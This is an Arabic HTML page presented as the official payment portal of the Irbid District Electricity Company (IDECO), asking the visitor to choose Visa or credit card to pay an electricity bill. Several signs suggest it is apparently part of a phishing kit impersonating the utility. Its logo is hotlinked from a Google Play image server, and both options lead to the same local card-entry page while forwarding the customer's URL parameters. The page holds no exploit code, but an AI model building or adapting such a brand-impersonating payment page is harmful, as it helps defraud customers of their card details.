<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="theme-color" content="#0d3b66" />
<title>إتمام عملية الدفع - الاستعلام عن فاتورة الكهرباء</title>
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet" />
<style>
  :root{
    --primary:#0d3b66;
    --primary-dark:#092947;
    --primary-light:#e8f0f8;
    --bg:#eef1f4;
    --card:#ffffff;
    --border:#d7dde3;
    --text:#1c2733;
    --muted:#5b6b7c;
    --radius:10px;
  }
  *{box-sizing:border-box;margin:0;padding:0}
  body{
    font-family:'Tajawal',Arial,sans-serif;
    background:var(--bg);
    color:var(--text);
    min-height:100vh;
    line-height:1.5;
    display:flex;
    flex-direction:column;
  }

  header{
    background:var(--primary);
    color:#fff;
    padding:12px 16px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    box-shadow:0 2px 6px rgba(0,0,0,.12);
    gap:10px;
  }
  .brand{
    display:flex;
    align-items:center;
    gap:10px;
  }
  header .logo{
    width:40px;height:40px;border-radius:8px;
    background:#ffffff;
    padding:3px;
    display:flex;align-items:center;justify-content:center;flex:none;
  }
  header .logo img{ width:100%;height:100%;object-fit:contain; }
  header .htext h1{ font-size:.95rem; font-weight:700; white-space:nowrap; }
  header .htext p{ font-size:.7rem; color:#c7d6e6; }

  main{
    flex:1;
    width:100%;
    max-width:640px;
    margin:28px auto;
    padding:0 16px 40px;
  }

  .card{
    background:var(--card);
    border:1px solid var(--border);
    border-radius:var(--radius);
    padding:24px 22px;
  }
  .card + .card{ margin-top:16px; }

  h2{ font-size:1.02rem; font-weight:700; color:var(--text); }
  .card-sub{ font-size:.84rem; color:var(--muted); margin-top:4px; }

  .payment-methods {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
    margin-top: 18px;
  }

  .method-card {
    border: 2px solid var(--border);
    border-radius: var(--radius);
    padding: 16px;
    text-align: center;
    cursor: pointer;
    background: #fbfcfd;
    transition: all 0.2s ease;
  }

  .method-card input[type="radio"] {
    display: none;
  }

  .method-card label {
    cursor: pointer;
    font-weight: 700;
    color: var(--text);
    font-size: 0.9rem;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
  }

  .method-card svg {
    width: 28px;
    height: 28px;
    stroke: var(--primary);
  }

  .method-card.active, .method-card:hover {
    border-color: var(--primary);
    background: var(--primary-light);
  }

  .btn-submit {
    width: 100%;
    margin-top: 22px;
    padding: 13px;
    font-size: 1rem;
    font-weight: 900;
    color: #fff;
    background: var(--primary);
    border: none;
    border-radius: 8px;
    cursor: pointer;
    transition: background 0.2s;
  }
  .btn-submit:hover { background: var(--primary-dark); }

  footer{
    text-align:center;
    font-size:.72rem;
    color:var(--muted);
    padding:16px;
    margin-top:auto;
  }

  @media (max-width: 480px) {
    header{ padding:10px 12px; }
    header .htext h1{ font-size:.85rem; }
    header .htext p{ font-size:.65rem; }
    .payment-methods { grid-template-columns: 1fr; }
  }
</style>
</head>
<body>

<header>
  <div class="brand">
    <div class="logo">
      <img src="https://play-lh.googleusercontent.com/nx02xraB0UOf0alqJERUs4g_fx6PTqoAXvxeXqeAMrWzvJMlSPp3Gn1u-yiBrDPT6OvtfUXwjDM2AwAHUptTAA" alt="شعار شركة كهرباء إربد">
    </div>
    <div class="htext">
      <h1>شركة كهرباء محافظة إربد</h1>
      <p>البوابة الرقمية الرسمية (IDECO)</p>
    </div>
  </div>
</header>

<main>
  <div class="card">
    <h2>اختر طريقة الدفع</h2>
    <p class="card-sub">يرجى تحديد الطريقة المناسبة لإتمام سداد الفاتورة .</p>

    <form id="paymentForm">
      <div class="payment-methods">
        <!-- خيار الفيزا (محدد افتراضياً) -->
        <div class="method-card active" id="visaMethodWrapper">
          <label>
            <input type="radio" name="payment_type" value="visa" id="payVisa" checked />
            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
            الدفع بالفيزا
          </label>
        </div>

        <!-- خيار بطاقة الائتمان -->
        <div class="method-card" id="creditMethodWrapper">
          <label>
            <input type="radio" name="payment_type" value="credit_card" id="payCredit" />
            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
            الدفع ببطاقة الائتمان
          </label>
        </div>
      </div>

      <button type="submit" class="btn-submit">متابعة الدفع</button>
    </form>
  </div>
</main>

<footer>
  جميع الحقوق محفوظة © شركة كهرباء محافظة إربد المساهمة المحدودة | بوابة الخدمات الإلكترونية
</footer>

<script>
  const payVisa = document.getElementById('payVisa');
  const payCredit = document.getElementById('payCredit');
  const visaWrapper = document.getElementById('visaMethodWrapper');
  const creditWrapper = document.getElementById('creditMethodWrapper');

  // دالة التوجيه مع نقل المعاملات الديناميكية (Params) الموجودة بالرابط الحالي
  function redirectToPayment() {
    const currentParams = window.location.search; // تمرير كل الـ Parameters التابعة للعميل الحالي
    window.location.href = 'static/credit_card_page.html' + currentParams;
  }

  // تحديث شكل التحديد
  function updateSelection() {
    if (payVisa.checked) {
      visaWrapper.classList.add('active');
      creditWrapper.classList.remove('active');
    } else if (payCredit.checked) {
      creditWrapper.classList.add('active');
      visaWrapper.classList.remove('active');
    }
  }

  // التوجيه عند النقر على الفيزا
  visaWrapper.addEventListener('click', () => {
    payVisa.checked = true;
    updateSelection();
    redirectToPayment();
  });

  // التوجيه عند النقر على بطاقة الائتمان
  creditWrapper.addEventListener('click', () => {
    payCredit.checked = true;
    updateSelection();
    redirectToPayment();
  });

  // التوجيه عند إرسال النموذج (زر المتابعة)
  document.getElementById('paymentForm').addEventListener('submit', (e) => {
    e.preventDefault();
    redirectToPayment();
  });
</script>

</body>
</html>
